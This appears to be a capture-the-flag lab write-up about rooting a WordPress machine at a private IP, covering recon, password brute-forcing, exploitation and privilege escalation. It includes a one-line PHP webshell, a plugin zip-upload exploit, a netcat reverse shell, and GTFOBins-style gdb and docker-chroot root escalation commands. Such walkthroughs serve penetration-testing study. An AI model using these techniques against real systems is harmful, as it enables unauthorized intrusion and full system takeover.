# Reconnaissance

We start the the recon process by using nmap
`nmap -sC -sV 192.168.0.25`

![nmap scan](imgs/nmap.png)

The machine contain common 2 port that is http and ssh port. First let's view the http port in the web browser.

![web view](imgs/browser.png)

Basic things to do when viewing web page is to view the page source and find the technologies that the website use. Using Wappalyzer, we know that the web page use Wordpress version 5.3.2.

![wapplyzer](imgs/wappalyzer.png)

After knowing that the web page use the wordpress, we can use WPScan to scan the web page and look if we can found interesting information.
`wpscan --url 192.168.0.25 --enumere u`

By using WPScan user enumeration, it will scan the Wordpress detail that being use by the website and found possible user that contain in the website. Based on the scan, we found two user that can possibly exploit.

![wpuser](imgs/wpuser.png)

# Exploit

Next, let's look if there are any directory that usefull in this webpage.
`dirsearch --url 192.168.0.25 -i 200`

![dirsearch](imgs/dirsearch.png)

It's look like the webpage contain basic wordpress directory that can be access in the web browser. We can look through all the directory to check if there any info that can we collect. But first, let's run wordpress user bruteforce to get password for the user.
`wpscan --url 192.168.0.25 --passwords /wordlists/rockyou.txt`

![credFound](imgs/valid.png)

By using bruteforce, we found the password for user **reconauthor**. Now we can access /wp-login.php/ to login into the Wordpress dashboard by using the credential we found.

![wpdashboard](imgs/dashboard.png)

After successfully log in into the user Wordpress dashboard, let's enumerate the Wordpress and search for any vulnerability that can be use to enter the server system.

Viewing each post, we found one post that may be help for us. This post said to add payload and it come with e-Learning plugin to upload to zip file.

![e-learning](imgs/elearning.png)

By google a little bit about the e-Learning plugin, we found the exploit that can be use to make remote code execution into the server.

![google](imgs/google.png)

![exploitdb](imgs/exploitdb.png)

The exploit said that we can craft the webshell and zip it to upload into the e-Learning plugin. After the upload process, we can access our webshell by the given path.

So first, let's craft two file that is index.html and index.php containing the webshell. We can use simple PHP webshell in the index.php file. For the index.html file, just put any text inside it as it just to make the e-Learning plugin can identify the index.html file.

```php
<?php system($_GET['cmd']); ?>
```

Zip both of the index.html file and index.php file.
`zip exploit.zip index.html index.php`

Now is the time to upload the webshell into the Wordpress. First, add new post, next click plus button that will add block. Choose e-Learning plugin from the block and new e-Learning block will appear. Click upload then choose the zip file that we create earlier. Click upload and choose insert as iFrame then click insert. The zip file already uploaded to the system and can be access using the given path.

![insert](imgs/insert.png)

We can access the webshell by using the url
`http://192.168.0.25/wp-content/uploads/articulate_uploads/exploit/index.php?cmd=id`

The webshell can be use as remote code execution in the system.

![id](imgs/id.png)

After we get the webshell, we can establish reverse shell to connect to the system shell, we can use php-reverse-shell by pentest monkey to the the job for us. Setup the netcat listener, then upload the reverse shell file and we got the reverse shell from the server.

![reverseshell](imgs/reverseshell.png)

Let's establish [**interactive shell**](https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/) first.

# Privilege Escalation

We are now www-data user, let's check what user in this machine using /etc/passwd.

![passwd](imgs/passwd.png)

There are 3 users in the machine that is root, hacker and offensive hack. For the privilege escalation process, let's first try to check sudo access for www-data user by using `sudo -l` command.

![sudo](imgs/sudo.png)

Greate, so there are sudo permission that this user can use and it was **/usr/bin/gdb**. Let's check GTFObins if there any exploitation can be use using gdb.

![gtfobins](imgs/gtfobins.png)

So, we can get the escalate to offensivehack user by using the gdb. Run this command and we got offensivehack user shell.
`sudo -u offensivehack gdb -nx -ex '!sh' -ex quit`

![offensivehackuser](imgs/offensivehack.png)

After we got offensivehack user, we can continue our privilege escalation to get the root user. The first interesting things that we see from user id is this user can run docker command. So, let's try to do privilege escalation by exploiting docker. First, check what docker images this machine contain.

![dockerimages](imgs/dockercheck.png)

This machine contain ubuntu images. So we can find the exploitation command in the GTFObins to be use with the ubuntu images.
````
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
````

![gtfobinsdocker](imgs/gtfobinsdocker.png)

By running the command, we got the root user and complete this machine. :D

![rootuser](imgs/root.png)

***

# Tips4Todays

- WPScan is very usefull, you can use it everytime you found Wordpress website and try to enumerate the user.
- Check the user id, it may help to find the vulnerabilities to exploit during privesc.
- Go through the all wordpress posts, files or plugins to find information that may be usefull for exploitation.

Prepared by 4jai
31/1/2023


